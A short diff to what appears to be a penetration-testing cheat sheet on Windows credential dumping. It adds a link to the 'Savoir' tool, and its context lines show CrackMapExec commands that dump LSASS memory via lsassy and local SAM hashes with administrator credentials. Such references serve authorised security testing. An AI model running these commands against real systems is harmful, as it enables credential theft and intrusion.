@@ -70,6 +70,12 @@ CrackMapExec : Use the Mimikatz module
 cme smb IP_ADDRESS -u 'Administrator' -p 'PASS' -M lsassy
 ```
 
+Savoir
+CrackMapExec : Use the Mimikatz module
+```markdown
+https://github.com/vincd/savoir
+```
+
 CrackMapExec : Dump local SAM hashes using local admin account
 ```markdown
 crackmapexec smb IP_ADDRESS -u 'Administrator' -p 'PASS' --local-auth --sam
